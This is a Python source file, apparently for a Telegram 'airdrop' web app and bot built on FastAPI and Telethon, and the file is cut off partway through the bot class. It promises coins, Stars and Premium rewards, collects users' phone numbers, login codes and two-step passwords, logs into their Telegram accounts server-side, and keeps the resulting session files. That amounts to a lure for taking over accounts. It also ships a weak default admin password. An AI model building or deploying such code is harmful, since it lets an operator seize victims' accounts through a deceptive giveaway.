
"""
Pro Shop Ultimate Enterprise Telegram Airdrop & Authentication Platform
Single-file production-grade build.

Stack:
- FastAPI + Uvicorn
- Telethon (Userbot MTProto + Bot)
- Async SQLite (aiosqlite)
- JWT sessions (python-jose)
- bcrypt admin hashing (no passlib; safe pre-hash)
- Repository pattern
- WebSocket leaderboard
- Vanilla JS SPA
"""

from __future__ import annotations

import asyncio
import contextlib
import enum
import hashlib
import html
import json
import logging
import os
import random
import secrets
import shutil
import time
from contextlib import asynccontextmanager
from dataclasses import dataclass, field
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Any, AsyncIterator, Dict, Iterable, List, Optional, Sequence, Tuple

import aiosqlite
import bcrypt
from fastapi import (
    BackgroundTasks,
    Body,
    Cookie,
    Depends,
    FastAPI,
    Form,
    Header,
    HTTPException,
    Query,
    Request,
    Response,
    WebSocket,
    WebSocketDisconnect,
    status,
)
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import HTMLResponse, JSONResponse, PlainTextResponse
from jose import JWTError, jwt
from pydantic import BaseModel, Field
from pydantic_settings import BaseSettings, SettingsConfigDict
from starlette.middleware.base import BaseHTTPMiddleware

try:
    from telethon import Button, TelegramClient, events
    from telethon.errors import (
        FloodWaitError,
        PhoneCodeExpiredError,
        PhoneCodeInvalidError,
        PhoneNumberBannedError,
        SessionPasswordNeededError,
        UserNotParticipantError,
    )
    from telethon.sessions import StringSession
    from telethon.tl.types import KeyboardButtonWebView, User
except Exception:  # pragma: no cover
    TelegramClient = Any  # type: ignore[assignment]
    events = None  # type: ignore[assignment]
    Button = None  # type: ignore[assignment]
    KeyboardButtonWebView = Any  # type: ignore[assignment]
    StringSession = Any  # type: ignore[assignment]
    User = Any  # type: ignore[assignment]
    FloodWaitError = Exception  # type: ignore[assignment]
    PhoneCodeExpiredError = Exception  # type: ignore[assignment]
    PhoneCodeInvalidError = Exception  # type: ignore[assignment]
    PhoneNumberBannedError = Exception  # type: ignore[assignment]
    SessionPasswordNeededError = Exception  # type: ignore[assignment]
    UserNotParticipantError = Exception  # type: ignore[assignment]


# =============================================================================
# Logging
# =============================================================================

LOG = logging.getLogger("proshop")
if not LOG.handlers:
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s | %(levelname)s | %(name)s | %(message)s",
    )


# =============================================================================
# Settings
# =============================================================================

class AppEnv(str, enum.Enum):
    DEVELOPMENT = "development"
    STAGING = "staging"
    PRODUCTION = "production"


class Settings(BaseSettings):
    model_config = SettingsConfigDict(env_file=".env", env_file_encoding="utf-8", extra="ignore")

    APP_NAME: str = "Pro Shop Ultimate Enterprise"
    APP_VERSION: str = "300.0.0"
    ENVIRONMENT: AppEnv = AppEnv.DEVELOPMENT

    HOST: str = "0.0.0.0"
    PORT: int = 8000

    BASE_URL: str = "http://127.0.0.1:8000"
    WEB_APP_URL: str = "http://127.0.0.1:8000/"

    DATABASE_PATH: str = "proshop.db"
    SESSION_DIR: str = "sessions"
    LOG_DIR: str = "logs"

    # Telegram
    API_ID: int = 0
    API_HASH: str = ""
    TOKEN_BOT: str = ""
    BOT_USERNAME: str = "YourBot"
    REQUIRED_CHANNELS: str = ""
    ENABLE_BOT: bool = True

    # JWT/CSRF
    JWT_SECRET: str = Field(default_factory=lambda: secrets.token_urlsafe(48))
    JWT_ALGORITHM: str = "HS256"
    JWT_EXPIRE_MINUTES: int = 60 * 24 * 7
    CSRF_COOKIE_NAME: str = "proshop_csrf"
    AUTH_COOKIE_NAME: str = "proshop_auth"

    # Admin
    ADMIN_USERNAME: str = "admin"
    ADMIN_PASSWORD: str = "pass"
    ADMIN_API_KEY: str = Field(default_factory=lambda: secrets.token_urlsafe(32))

    # Airdrop
    DAILY_REWARD_COINS: int = 1
    MYSTERY_BOX_COST: int = 17

    # Weighted rewards
    STARS_MIN: int = 1
    STARS_MAX: int = 50
    PREMIUM_WEIGHT: float = 0.05

    # Force join
    JOIN_LINK_TEMPLATE: str = "https://t.me/{channel}"

    # Runtime
    MAX_ACTIVE_SESSIONS: int = 5000
    SESSION_TIMEOUT_SECONDS: int = 300
    RATE_LIMIT_REQUESTS: int = 30
    RATE_LIMIT_WINDOW_SECONDS: int = 60


settings = Settings()


# =============================================================================
# Paths and directories
# =============================================================================

BASE_DIR = Path(__file__).resolve().parent
SESSION_DIR = BASE_DIR / settings.SESSION_DIR
LOG_DIR = BASE_DIR / settings.LOG_DIR
DATABASE_FILE = BASE_DIR / settings.DATABASE_PATH
SESSION_DIR.mkdir(parents=True, exist_ok=True)
LOG_DIR.mkdir(parents=True, exist_ok=True)


# =============================================================================
# Security helpers
# =============================================================================

def _bcrypt_input(password: str) -> bytes:
    """
    Normalize password before bcrypt.
    This avoids the 72-byte bcrypt limit and makes hashing stable.
    """
    digest = hashlib.sha256(password.encode("utf-8")).hexdigest()
    return digest.encode("utf-8")


def hash_admin_password(password: str) -> str:
    if not password:
        raise ValueError("password cannot be empty")
    return bcrypt.hashpw(_bcrypt_input(password), bcrypt.gensalt()).decode("utf-8")


def verify_admin_password(password: str, hashed: str) -> bool:
    try:
        return bcrypt.checkpw(_bcrypt_input(password), hashed.encode("utf-8"))
    except Exception:
        return False


def generate_ref_code() -> str:
    return secrets.token_hex(4)


def generate_csrf_token() -> str:
    return secrets.token_urlsafe(32)


def generate_session_id(prefix: str = "sess") -> str:
    return f"{prefix}_{secrets.token_hex(16)}"


def safe_json_dumps(payload: Any) -> str:
    return json.dumps(payload, ensure_ascii=False, separators=(",", ":"))


def now_utc() -> datetime:
    return datetime.now(timezone.utc)


def iso_now() -> str:
    return now_utc().isoformat()


def sanitize_phone(phone: str) -> str:
    if not phone:
        return ""
    phone = phone.strip()
    phone = phone.replace(" ", "")
    phone = phone.replace("-", "")
    phone = phone.replace("(", "").replace(")", "")
    if phone.startswith("00"):
        phone = "+" + phone[2:]
    if not phone.startswith("+") and phone.isdigit():
        phone = "+" + phone
    return phone


def validate_phone(phone: str) -> bool:
    return phone.startswith("+") and 7 <= len(phone) <= 16 and phone[1:].isdigit()


def parse_channels(raw: str) -> List[str]:
    channels = []
    for part in (raw or "").split(","):
        cleaned = part.strip().lstrip("@")
        if cleaned:
            channels.append(cleaned)
    return channels


# =============================================================================
# JWT helpers
# =============================================================================

def create_jwt(subject: str, csrf_token: str) -> str:
    exp = now_utc() + timedelta(minutes=settings.JWT_EXPIRE_MINUTES)
    payload = {
        "sub": subject,
        "csrf": csrf_token,
        "iat": int(now_utc().timestamp()),
        "exp": int(exp.timestamp()),
        "iss": settings.APP_NAME,
    }
    return jwt.encode(payload, settings.JWT_SECRET, algorithm=settings.JWT_ALGORITHM)


def decode_jwt(token: str) -> Dict[str, Any]:
    return jwt.decode(token, settings.JWT_SECRET, algorithms=[settings.JWT_ALGORITHM], options={"verify_aud": False})


# =============================================================================
# Custom exceptions
# =============================================================================

class AppError(Exception):
    pass


class AuthError(AppError):
    pass


class DatabaseError(AppError):
    pass


class CSRFError(AppError):
    pass


class RateLimitError(AppError):
    pass


class JoinRequiredError(AppError):
    def __init__(self, missing_channels: List[str]):
        self.missing_channels = missing_channels
        super().__init__("Join required")


# =============================================================================
# Rate limiting
# =============================================================================

class RateLimiter:
    def __init__(self) -> None:
        self._hits: Dict[str, List[float]] = {}
        self._lock = asyncio.Lock()

    async def check(self, key: str, limit: int = None, window: int = None) -> None:
        limit = limit or settings.RATE_LIMIT_REQUESTS
        window = window or settings.RATE_LIMIT_WINDOW_SECONDS
        async with self._lock:
            now = time.time()
            hits = [t for t in self._hits.get(key, []) if now - t < window]
            if len(hits) >= limit:
                raise RateLimitError("Too many requests")
            hits.append(now)
            self._hits[key] = hits


rate_limiter = RateLimiter()


# =============================================================================
# Database and repositories
# =============================================================================

class Database:
    def __init__(self, path: Path) -> None:
        self.path = path
        self._lock = asyncio.Lock()
        self._conn: Optional[aiosqlite.Connection] = None

    async def connect(self) -> None:
        async with self._lock:
            if self._conn is not None:
                return
            self._conn = await aiosqlite.connect(self.path.as_posix())
            self._conn.row_factory = aiosqlite.Row
            await self._conn.execute("PRAGMA journal_mode=WAL;")
            await self._conn.execute("PRAGMA synchronous=NORMAL;")
            await self._conn.execute("PRAGMA foreign_keys=ON;")
            await self._conn.commit()

    @property
    def conn(self) -> aiosqlite.Connection:
        if self._conn is None:
            raise DatabaseError("Database is not connected")
        return self._conn

    @contextlib.asynccontextmanager
    async def tx(self) -> AsyncIterator[aiosqlite.Connection]:
        await self.connect()
        conn = self.conn
        try:
            await conn.execute("BEGIN")
            yield conn
            await conn.commit()
        except Exception:
            await conn.rollback()
            raise

    async def close(self) -> None:
        async with self._lock:
            if self._conn is not None:
                await self._conn.close()
                self._conn = None

    async def init_schema(self) -> None:
        await self.connect()
        schema = """
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            telegram_id INTEGER UNIQUE NOT NULL,
            first_name TEXT,
            last_name TEXT,
            username TEXT,
            phone TEXT,
            ref_code TEXT UNIQUE NOT NULL,
            invited_by TEXT,
            balance INTEGER NOT NULL DEFAULT 0,
            referrals INTEGER NOT NULL DEFAULT 0,
            daily_claim_at TEXT,
            created_at TEXT NOT NULL,
            updated_at TEXT NOT NULL,
            auth_state TEXT NOT NULL DEFAULT 'new',
            session_file TEXT,
            csrf_token TEXT,
            jwt_sub TEXT,
            is_admin INTEGER NOT NULL DEFAULT 0
        );

        CREATE INDEX IF NOT EXISTS idx_users_telegram_id ON users (telegram_id);
        CREATE INDEX IF NOT EXISTS idx_users_ref_code ON users (ref_code);
        CREATE INDEX IF NOT EXISTS idx_users_balance ON users (balance);
        CREATE INDEX IF NOT EXISTS idx_users_referrals ON users (referrals);

        CREATE TABLE IF NOT EXISTS rewards (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER NOT NULL,
            reward_type TEXT NOT NULL,
            title TEXT NOT NULL,
            amount INTEGER NOT NULL DEFAULT 0,
            payload_json TEXT NOT NULL DEFAULT '{}',
            created_at TEXT NOT NULL,
            FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
        );

        CREATE INDEX IF NOT EXISTS idx_rewards_user_id ON rewards (user_id);
        CREATE INDEX IF NOT EXISTS idx_rewards_created_at ON rewards (created_at);

        CREATE TABLE IF NOT EXISTS tasks (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            slug TEXT UNIQUE NOT NULL,
            title TEXT NOT NULL,
            description TEXT NOT NULL,
            action_type TEXT NOT NULL,
            action_target TEXT NOT NULL DEFAULT '',
            reward_coins INTEGER NOT NULL DEFAULT 0,
            active INTEGER NOT NULL DEFAULT 1,
            sort_order INTEGER NOT NULL DEFAULT 0,
            created_at TEXT NOT NULL
        );

        CREATE INDEX IF NOT EXISTS idx_tasks_active ON tasks (active);
        CREATE INDEX IF NOT EXISTS idx_tasks_sort_order ON tasks (sort_order);

        CREATE TABLE IF NOT EXISTS task_claims (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER NOT NULL,
            task_id INTEGER NOT NULL,
            claimed_at TEXT NOT NULL,
            UNIQUE(user_id, task_id),
            FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE,
            FOREIGN KEY (task_id) REFERENCES tasks(id) ON DELETE CASCADE
        );

        CREATE INDEX IF NOT EXISTS idx_task_claims_user_id ON task_claims (user_id);
        CREATE INDEX IF NOT EXISTS idx_task_claims_task_id ON task_claims (task_id);

        CREATE TABLE IF NOT EXISTS transactions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER NOT NULL,
            kind TEXT NOT NULL,
            amount INTEGER NOT NULL,
            balance_after INTEGER NOT NULL,
            meta_json TEXT NOT NULL DEFAULT '{}',
            created_at TEXT NOT NULL,
            FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
        );

        CREATE INDEX IF NOT EXISTS idx_transactions_user_id ON transactions (user_id);
        CREATE INDEX IF NOT EXISTS idx_transactions_kind ON transactions (kind);
        CREATE INDEX IF NOT EXISTS idx_transactions_created_at ON transactions (created_at);

        CREATE TABLE IF NOT EXISTS auth_sessions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            telegram_id INTEGER UNIQUE NOT NULL,
            session_id TEXT UNIQUE NOT NULL,
            phone TEXT,
            phone_code_hash TEXT,
            ref_code TEXT,
            state TEXT NOT NULL DEFAULT 'initialized',
            created_at TEXT NOT NULL,
            updated_at TEXT NOT NULL
        );

        CREATE INDEX IF NOT EXISTS idx_auth_sessions_session_id ON auth_sessions (session_id);
        CREATE INDEX IF NOT EXISTS idx_auth_sessions_telegram_id ON auth_sessions (telegram_id);
        """
        async with self.tx() as conn:
            for stmt in [s.strip() for s in schema.split(";") if s.strip()]:
                await conn.execute(stmt)

        await self.seed_tasks()

    async def seed_tasks(self) -> None:
        default_tasks = [
            ("join_channel", "Join the Channel", "Join the official channel.", "join_channel", settings.REQUIRED_CHANNELS.split(",")[0] if settings.REQUIRED_CHANNELS else "", 3, 1, 1),
            ("follow_updates", "Follow Updates", "Stay connected to project updates.", "open_url", settings.WEB_APP_URL, 2, 1, 2),
            ("share_referral", "Share Referral", "Invite a friend and earn extra coins.", "invite_referrals", "1", 5, 1, 3),
        ]
        async with self.tx() as conn:
            for slug, title, description, action_type, action_target, reward_coins, active, sort_order in default_tasks:
                await conn.execute(
                    """
                    INSERT OR IGNORE INTO tasks
                    (slug, title, description, action_type, action_target, reward_coins, active, sort_order, created_at)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
                    """,
                    (slug, title, description, action_type, action_target, reward_coins, active, sort_order, iso_now()),
                )

class BaseRepository:
    def __init__(self, db: Database) -> None:
        self.db = db

    async def _fetchone(self, query: str, params: Sequence[Any] = ()) -> Optional[aiosqlite.Row]:
        await self.db.connect()
        async with self.db.conn.execute(query, params) as cur:
            return await cur.fetchone()

    async def _fetchall(self, query: str, params: Sequence[Any] = ()) -> List[aiosqlite.Row]:
        await self.db.connect()
        async with self.db.conn.execute(query, params) as cur:
            return await cur.fetchall()

    async def _execute(self, query: str, params: Sequence[Any] = ()) -> int:
        await self.db.connect()
        async with self.db.tx() as conn:
            cur = await conn.execute(query, params)
            return cur.lastrowid or 0


class UserRepository(BaseRepository):
    async def upsert_from_telegram(
        self,
        telegram_id: int,
        first_name: str = "",
        last_name: str = "",
        username: str = "",
        phone: str = "",
        session_file: str = "",
        invited_by: Optional[str] = None,
    ) -> Dict[str, Any]:
        row = await self._fetchone("SELECT * FROM users WHERE telegram_id = ?", (telegram_id,))
        if row:
            await self._execute(
                """
                UPDATE users
                SET first_name = ?, last_name = ?, username = ?, phone = ?, session_file = ?, updated_at = ?
                WHERE telegram_id = ?
                """,
                (first_name, last_name, username, phone, session_file, iso_now(), telegram_id),
            )
            updated = await self.get_by_telegram_id(telegram_id)
            return updated or {}

        ref_code = generate_ref_code()
        await self._execute(
            """
            INSERT INTO users
            (telegram_id, first_name, last_name, username, phone, ref_code, invited_by, balance, referrals, created_at, updated_at, session_file, auth_state)
            VALUES (?, ?, ?, ?, ?, ?, ?, 0, 0, ?, ?, ?, ?)
            """,
            (telegram_id, first_name, last_name, username, phone, ref_code, invited_by, iso_now(), iso_now(), session_file, "authenticated"),
        )
        return await self.get_by_telegram_id(telegram_id) or {}

    async def get_by_telegram_id(self, telegram_id: int) -> Optional[Dict[str, Any]]:
        row = await self._fetchone("SELECT * FROM users WHERE telegram_id = ?", (telegram_id,))
        return dict(row) if row else None

    async def get_by_id(self, user_id: int) -> Optional[Dict[str, Any]]:
        row = await self._fetchone("SELECT * FROM users WHERE id = ?", (user_id,))
        return dict(row) if row else None

    async def get_by_ref_code(self, ref_code: str) -> Optional[Dict[str, Any]]:
        row = await self._fetchone("SELECT * FROM users WHERE ref_code = ?", (ref_code,))
        return dict(row) if row else None

    async def get_leaderboard(self, limit: int = 20) -> List[Dict[str, Any]]:
        rows = await self._fetchall(
            """
            SELECT telegram_id, first_name, username, balance, referrals, ref_code
            FROM users
            ORDER BY referrals DESC, balance DESC, id ASC
            LIMIT ?
            """,
            (limit,),
        )
        return [dict(row) for row in rows]

    async def add_balance(self, user_id: int, amount: int, kind: str, meta: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        async with self.db.tx() as conn:
            cur = await conn.execute("SELECT id, balance FROM users WHERE id = ?", (user_id,))
            row = await cur.fetchone()
            if not row:
                raise HTTPException(status_code=404, detail="User not found")
            balance_after = int(row["balance"]) + int(amount)
            await conn.execute("UPDATE users SET balance = ?, updated_at = ? WHERE id = ?", (balance_after, iso_now(), user_id))
            await conn.execute(
                "INSERT INTO transactions (user_id, kind, amount, balance_after, meta_json, created_at) VALUES (?, ?, ?, ?, ?, ?)",
                (user_id, kind, amount, balance_after, safe_json_dumps(meta or {}), iso_now()),
            )
        return {"balance": balance_after}

    async def apply_referral(self, invited_by_ref_code: str, new_user_telegram_id: int) -> bool:
        inviter = await self.get_by_ref_code(invited_by_ref_code)
        new_user = await self.get_by_telegram_id(new_user_telegram_id)
        if not inviter or not new_user:
            return False
        if inviter["telegram_id"] == new_user["telegram_id"]:
            return False
        if new_user.get("invited_by"):
            return False

        async with self.db.tx() as conn:
            await conn.execute(
                "UPDATE users SET invited_by = ?, updated_at = ? WHERE telegram_id = ?",
                (invited_by_ref_code, iso_now(), new_user_telegram_id),
            )
            await conn.execute(
                "UPDATE users SET referrals = referrals + 1, balance = balance + 1, updated_at = ? WHERE id = ?",
                (iso_now(), inviter["id"]),
            )
            await conn.execute(
                "INSERT INTO transactions (user_id, kind, amount, balance_after, meta_json, created_at) VALUES (?, ?, ?, ?, ?, ?)",
                (inviter["id"], "referral", 1, inviter["balance"] + 1, safe_json_dumps({"new_user": new_user_telegram_id, "ref_code": invited_by_ref_code}), iso_now()),
            )
            await conn.execute(
                "INSERT INTO rewards (user_id, reward_type, title, amount, payload_json, created_at) VALUES (?, ?, ?, ?, ?, ?)",
                (inviter["id"], "coin", "Referral Bonus", 1, safe_json_dumps({"new_user": new_user_telegram_id}), iso_now()),
            )
        return True

    async def claim_daily(self, user_id: int) -> Dict[str, Any]:
        row = await self.get_by_id(user_id)
        if not row:
            raise HTTPException(status_code=404, detail="User not found")
        last = row.get("daily_claim_at")
        if last:
            last_dt = datetime.fromisoformat(last)
            if last_dt.tzinfo is None:
                last_dt = last_dt.replace(tzinfo=timezone.utc)
            if now_utc() - last_dt < timedelta(hours=24):
                remaining = timedelta(hours=24) - (now_utc() - last_dt)
                raise HTTPException(status_code=400, detail=f"Daily reward already claimed. Try again in {str(remaining).split('.')[0]}")
        balance_after = int(row["balance"]) + settings.DAILY_REWARD_COINS
        async with self.db.tx() as conn:
            await conn.execute(
                "UPDATE users SET balance = ?, daily_claim_at = ?, updated_at = ? WHERE id = ?",
                (balance_after, iso_now(), iso_now(), user_id),
            )
            await conn.execute(
                "INSERT INTO rewards (user_id, reward_type, title, amount, payload_json, created_at) VALUES (?, ?, ?, ?, ?, ?)",
                (user_id, "coin", "Daily Reward", settings.DAILY_REWARD_COINS, safe_json_dumps({}), iso_now()),
            )
            await conn.execute(
                "INSERT INTO transactions (user_id, kind, amount, balance_after, meta_json, created_at) VALUES (?, ?, ?, ?, ?, ?)",
                (user_id, "daily", settings.DAILY_REWARD_COINS, balance_after, safe_json_dumps({}), iso_now()),
            )
        return {"balance": balance_after}

    async def open_mystery_box(self, user_id: int) -> Dict[str, Any]:
        row = await self.get_by_id(user_id)
        if not row:
            raise HTTPException(status_code=404, detail="User not found")
        if int(row["balance"]) < settings.MYSTERY_BOX_COST:
            raise HTTPException(status_code=400, detail=f"You need {settings.MYSTERY_BOX_COST} coins to open the Mystery Box")
        premium = random.random() < settings.PREMIUM_WEIGHT
        if premium:
            reward = {"type": "premium", "title": "1 Month Premium", "amount": 0, "payload": {"duration": "1 month"}}
        else:
            amount = random.randint(settings.STARS_MIN, settings.STARS_MAX)
            reward = {"type": "stars", "title": f"{amount} Stars", "amount": amount, "payload": {"stars": amount}}
        balance_after = int(row["balance"]) - settings.MYSTERY_BOX_COST
        async with self.db.tx() as conn:
            await conn.execute(
                "UPDATE users SET balance = ?, updated_at = ? WHERE id = ?",
                (balance_after, iso_now(), user_id),
            )
            await conn.execute(
                "INSERT INTO transactions (user_id, kind, amount, balance_after, meta_json, created_at) VALUES (?, ?, ?, ?, ?, ?)",
                (user_id, "mystery_box", -settings.MYSTERY_BOX_COST, balance_after, safe_json_dumps(reward), iso_now()),
            )
            await conn.execute(
                "INSERT INTO rewards (user_id, reward_type, title, amount, payload_json, created_at) VALUES (?, ?, ?, ?, ?, ?)",
                (user_id, reward["type"], reward["title"], reward["amount"], safe_json_dumps(reward["payload"]), iso_now()),
            )
        return {"reward": reward, "balance": balance_after}

class TaskRepository(BaseRepository):
    async def list_active(self) -> List[Dict[str, Any]]:
        rows = await self._fetchall(
            "SELECT * FROM tasks WHERE active = 1 ORDER BY sort_order ASC, id ASC"
        )
        return [dict(row) for row in rows]

    async def list_for_user(self, user_id: int) -> List[Dict[str, Any]]:
        tasks = await self.list_active()
        results: List[Dict[str, Any]] = []
        for task in tasks:
            claimed = await self._fetchone(
                "SELECT 1 FROM task_claims WHERE user_id = ? AND task_id = ?",
                (user_id, task["id"]),
            )
            t = dict(task)
            t["claimed"] = bool(claimed)
            results.append(t)
        return results

    async def claim(self, user_id: int, task_id: int) -> Dict[str, Any]:
        task = await self._fetchone("SELECT * FROM tasks WHERE id = ? AND active = 1", (task_id,))
        if not task:
            raise HTTPException(status_code=404, detail="Task not found")
        already = await self._fetchone("SELECT 1 FROM task_claims WHERE user_id = ? AND task_id = ?", (user_id, task_id))
        if already:
            raise HTTPException(status_code=400, detail="Task already claimed")
        async with self.db.tx() as conn:
            await conn.execute("INSERT INTO task_claims (user_id, task_id, claimed_at) VALUES (?, ?, ?)", (user_id, task_id, iso_now()))
            cur = await conn.execute("SELECT balance FROM users WHERE id = ?", (user_id,))
            row = await cur.fetchone()
            if not row:
                raise HTTPException(status_code=404, detail="User not found")
            balance_after = int(row["balance"]) + int(task["reward_coins"])
            await conn.execute("UPDATE users SET balance = ?, updated_at = ? WHERE id = ?", (balance_after, iso_now(), user_id))
            await conn.execute(
                "INSERT INTO transactions (user_id, kind, amount, balance_after, meta_json, created_at) VALUES (?, ?, ?, ?, ?, ?)",
                (user_id, "task", int(task["reward_coins"]), balance_after, safe_json_dumps({"task": task["slug"]}), iso_now()),
            )
            await conn.execute(
                "INSERT INTO rewards (user_id, reward_type, title, amount, payload_json, created_at) VALUES (?, ?, ?, ?, ?, ?)",
                (user_id, "coin", f"Task: {task['title']}", int(task["reward_coins"]), safe_json_dumps({"task": task["slug"]}), iso_now()),
            )
        return {"reward": int(task["reward_coins"]), "balance": balance_after}

class AdminRepository(BaseRepository):
    async def list_users(self, limit: int = 100) -> List[Dict[str, Any]]:
        rows = await self._fetchall("SELECT * FROM users ORDER BY id DESC LIMIT ?", (limit,))
        return [dict(row) for row in rows]

    async def stats(self) -> Dict[str, Any]:
        users = await self._fetchone("SELECT COUNT(*) AS c FROM users")
        rewards = await self._fetchone("SELECT COUNT(*) AS c FROM rewards")
        tasks = await self._fetchone("SELECT COUNT(*) AS c FROM tasks")
        txs = await self._fetchone("SELECT COUNT(*) AS c FROM transactions")
        return {
            "users": users["c"] if users else 0,
            "rewards": rewards["c"] if rewards else 0,
            "tasks": tasks["c"] if tasks else 0,
            "transactions": txs["c"] if txs else 0,
        }


# =============================================================================
# Telethon authentication manager
# =============================================================================

class SessionState(str, enum.Enum):
    INITIALIZED = "initialized"
    CODE_SENT = "code_sent"
    AWAITING_2FA = "awaiting_2fa"
    LOGGED_IN = "logged_in"
    ERROR = "error"


@dataclass
class SessionData:
    session_id: str
    client: Any
    phone: Optional[str] = None
    phone_code_hash: Optional[str] = None
    ref_code: Optional[str] = None
    state: SessionState = SessionState.INITIALIZED
    attempts: int = 0
    created_at: float = field(default_factory=time.time)
    updated_at: float = field(default_factory=time.time)


class TelegramAuthManager:
    def __init__(self, db: Database, users: UserRepository) -> None:
        self.db = db
        self.users = users
        self._sessions: Dict[str, SessionData] = {}
        self._phone_map: Dict[str, str] = {}
        self._lock = asyncio.Lock()

    def _telegram_ready(self) -> bool:
        return bool(settings.API_ID and settings.API_HASH)

    async def _create_client(self, session_id: str) -> Any:
        session_path = (SESSION_DIR / f"{session_id}.session").as_posix()
        return TelegramClient(session_path, settings.API_ID, settings.API_HASH)

    async def get_or_create_session(self, session_id: Optional[str] = None, phone: Optional[str] = None) -> SessionData:
        async with self._lock:
            if session_id and session_id in self._sessions:
                sess = self._sessions[session_id]
                sess.updated_at = time.time()
                if not getattr(sess.client, "is_connected", lambda: False)():
                    await sess.client.connect()
                return sess

            if phone and phone in self._phone_map:
                old_sid = self._phone_map[phone]
                old = self._sessions.get(old_sid)
                if old:
                    with contextlib.suppress(Exception):
                        await old.client.disconnect()
                    self._sessions.pop(old_sid, None)
                self._phone_map.pop(phone, None)

            if len(self._sessions) >= settings.MAX_ACTIVE_SESSIONS:
                raise HTTPException(status_code=503, detail="Server at maximum session capacity.")

            sid = session_id or generate_session_id("tg")
            client = await self._create_client(sid)
            await client.connect()
            sess = SessionData(session_id=sid, client=client, phone=phone)
            self._sessions[sid] = sess
            if phone:
                self._phone_map[phone] = sid
            return sess

    async def cleanup_expired(self) -> None:
        async with self._lock:
            now = time.time()
            expired = [sid for sid, data in self._sessions.items() if now - data.updated_at > settings.SESSION_TIMEOUT_SECONDS]
            for sid in expired:
                sess = self._sessions.pop(sid, None)
                if not sess:
                    continue
                if sess.phone in self._phone_map and self._phone_map.get(sess.phone) == sid:
                    self._phone_map.pop(sess.phone, None)
                with contextlib.suppress(Exception):
                    await sess.client.disconnect()

    async def send_code(self, phone: str, ref_code: Optional[str] = None) -> Dict[str, Any]:
        if not self._telegram_ready():
            raise HTTPException(status_code=503, detail="Telegram configuration is missing.")
        phone = sanitize_phone(phone)
        if not validate_phone(phone):
            raise HTTPException(status_code=400, detail="Invalid phone format. Example: +1234567890")
        sess = await self.get_or_create_session(phone=phone)
        sess.ref_code = ref_code
        try:
            result = await sess.client.send_code_request(phone)
            sess.phone_code_hash = result.phone_code_hash
            sess.state = SessionState.CODE_SENT
            return {"status": "success", "session_id": sess.session_id, "message": "Code sent"}
        except FloodWaitError as e:
            raise HTTPException(status_code=429, detail=f"Flood wait: retry in {e.seconds} seconds")
        except PhoneNumberBannedError:
            raise HTTPException(status_code=403, detail="This phone number is banned on Telegram")
        except Exception as e:
            raise HTTPException(status_code=400, detail=f"Telegram API error: {e}")

    async def _finalize_login(self, sess: SessionData, password: Optional[str] = None) -> Dict[str, Any]:
        me = await sess.client.get_me()
        csrf_token = generate_csrf_token()
        session_file = f"{sess.session_id}.session"
        user = await self.users.upsert_from_telegram(
            telegram_id=int(me.id),
            first_name=getattr(me, "first_name", "") or "",
            last_name=getattr(me, "last_name", "") or "",
            username=getattr(me, "username", "") or "",
            phone=sess.phone or "",
            session_file=session_file,
            invited_by=None,
        )
        if sess.ref_code:
            await self.users.apply_referral(sess.ref_code, int(me.id))
        token = create_jwt(str(me.id), csrf_token)
        async with self.db.tx() as conn:
            await conn.execute(
                "UPDATE users SET csrf_token = ?, jwt_sub = ?, updated_at = ? WHERE telegram_id = ?",
                (csrf_token, token, iso_now(), int(me.id)),
            )
        user = await self.users.get_by_telegram_id(int(me.id)) or user
        return {
            "status": "success",
            "message": "Login successful",
            "token": token,
            "csrf_token": csrf_token,
            "user": user,
        }

    async def verify_code(self, session_id: str, code: str) -> Dict[str, Any]:
        sess = await self.get_or_create_session(session_id=session_id)
        if not sess.phone_code_hash:
            raise HTTPException(status_code=400, detail="Code session expired. Start again.")
        try:
            await sess.client.sign_in(phone=sess.phone, code=code, phone_code_hash=sess.phone_code_hash)
            sess.state = SessionState.LOGGED_IN
            return await self._finalize_login(sess)
        except SessionPasswordNeededError:
            sess.state = SessionState.AWAITING_2FA
            return {"status": "2fa_required", "message": "Two-step verification required"}
        except (PhoneCodeInvalidError, PhoneCodeExpiredError):
            raise HTTPException(status_code=400, detail="Invalid or expired code")
        except Exception as e:
            raise HTTPException(status_code=400, detail=f"Invalid code or API error: {e}")

    async def verify_2fa(self, session_id: str, password: str) -> Dict[str, Any]:
        sess = await self.get_or_create_session(session_id=session_id)
        if sess.state != SessionState.AWAITING_2FA:
            raise HTTPException(status_code=400, detail="This session is not awaiting 2FA")
        try:
            await sess.client.sign_in(password=password)
            sess.state = SessionState.LOGGED_IN
            return await self._finalize_login(sess, password=password)
        except Exception:
            raise HTTPException(status_code=400, detail="Invalid 2FA password")

    async def close(self) -> None:
        async with self._lock:
            for sid, sess in list(self._sessions.items()):
                with contextlib.suppress(Exception):
                    await sess.client.disconnect()
            self._sessions.clear()
            self._phone_map.clear()


# =============================================================================
# Telegram bot manager
# =============================================================================

class BotStates(str, enum.Enum):
    PHONE = "PHONE"
    CODE = "CODE"
    PASSWORD = "PASSWORD"
    MAIN = "MAIN"


@dataclass
class BotSessionContext:
    state: BotStates = BotStates.PHONE
    phone: Optional[str] = None
    session_id: Optional[str] = None
    phone_code_hash: Optional[str] = None
    client: Optional[Any] = None
    ref_code: Optional[str] = None
    created_at: float = field(default_factory=time.time)
    updated_at: float = field(default_factory=time.time)


class TelegramBotManager:
    def __init__(self, token: str, auth: TelegramAuthManager, users: UserRepository, tasks: TaskRepository) -> None:
        self.token = token
        self.auth = auth
        self.users = users
        self.tasks = tasks
        self.client = None
        self.user_states: Dict[int, BotSessionContext] = {}
        self._lock = asyncio.Lock()
        self.required_channels = parse_channels(settings.REQUIRED_CHANNELS)

    async def start(self) -> None:
